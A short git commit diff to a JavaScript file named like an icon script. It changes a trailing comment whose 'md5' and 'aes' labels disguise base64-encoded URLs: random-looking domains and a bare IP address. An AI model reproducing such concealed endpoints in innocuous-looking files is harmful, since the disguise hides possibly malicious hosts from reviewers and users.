5fe2a44f0e89feabd7457112285f05e6792e6a9f
daguo <daguo@gmail.com>
2023-05-22 22:53:58 +0800

    init

--- js/icon_1yronu.js
+++ js/icon_1yronu.js
@@ -8,4 +8,4 @@ if($.browser.mozilla||$.browser.opera)
 		function UnloadHandler() {
 				window.removeEventListener('beforeunload', UnloadHandler, false);
 		}
-})()/** md5:aHR0cHM6Ly93d3cuc2podmtnZnIuY29t**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
+})()/** md5:aHR0cHM6Ly93d3cua2NrbHF3a2Vpci5jb20=**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
